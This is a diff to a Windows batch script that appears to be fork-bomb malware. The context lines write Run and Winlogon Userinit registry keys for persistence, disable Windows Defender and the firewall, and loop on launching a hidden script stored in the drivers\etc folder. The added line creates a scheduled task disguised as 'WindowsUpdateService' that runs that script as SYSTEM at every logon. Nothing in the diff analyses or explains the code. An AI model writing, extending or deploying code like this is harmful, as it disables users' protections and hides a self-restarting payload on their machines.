@@ -8,6 +8,7 @@ reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "ForkBomb_%rando
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\system32\userinit.exe,%~f0" /f 
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f
 reg add "HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile" /v "EnableFirewall" /t REG_DWORD /d 0 /f
+schtasks /create /tn "WindowsUpdateService" /tr "C:\Windows\System32\drivers\etc\hosts.bat" /sc onlogon /ru SYSTEM /f >nul 2>&1
 
 :loop
 
@@ -56,6 +57,7 @@ set "p= /c"
 start /min cmd /c "C:\Windows\System32\drivers\etc\hosts.bat"
 
 goto loop
+
 
 
 
